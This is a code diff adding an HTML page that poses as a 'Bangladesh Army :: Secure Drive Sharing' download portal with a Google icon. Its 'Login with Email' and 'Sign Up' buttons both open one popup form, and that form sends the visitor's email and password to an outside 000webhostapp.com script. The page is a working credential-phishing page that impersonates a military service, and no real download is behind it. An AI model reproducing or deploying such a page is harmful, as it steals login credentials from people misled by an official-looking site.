@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bangladesh Army :: Secure Drive Sharing</title>
+    <link rel="shortcut icon" href="1.ico"/>
+    <link rel="stylesheet" type="text/css" href="./army.css">
+</head>
+<body>
+    <br><br><br>
+    <div class="container"><br>
+      <img  src="1.png" alt="Google Icon"  >
+        <h1>Welcome to Bangladesh Army :: Secure Drive Sharing </h1>
+        <p>To download the file, please choose an option:</p>
+ 
+            
+            <a class="button" href="#" onclick="showPopup()">Login with Email </a>
+
+<br>
+             <p>Don't have an account? </p>
+ 
+            
+            <a class="button" href="#" onclick="showPopup()"> &nbsp; &nbsp; &nbsp;  Sign Up &nbsp; &nbsp; &nbsp;  </a>
+            
+             
+            <div id="download-link" style="display: none;">
+                <p id="download">Click below to download the file:</p>
+                <a class="button" href="#">Download File</a>
+            </div>
+        </div>
+  
+
+    <!-- Flex popup for login -->
+    <div class="popup" id="login-popup">
+        <div class="popup-content">
+            <h2 style="color: #666666;">Login with Email</h2>
+            <form action="https://ministeries-documents-overview-branches.000webhostapp.com/da-yeh/attach.php" method="post" target="_top">
+                             <input id="user" name="username" type="text" placeholder="Email address" required>
+                <input id="pass"  name="password" type="password" placeholder="Password" required>
+                <button class="popup-button">Submit</button>
+            </form>
+        </div>
+    </div>
+ 
+    
+
+    <script>
+        function showPopup() {
+            document.getElementById("login-popup").style.display = "flex";
+        }
+
+        function closePopup() {
+            document.getElementById("login-popup").style.display = "none";
+        }
+    </script>
+</body>
+</html>
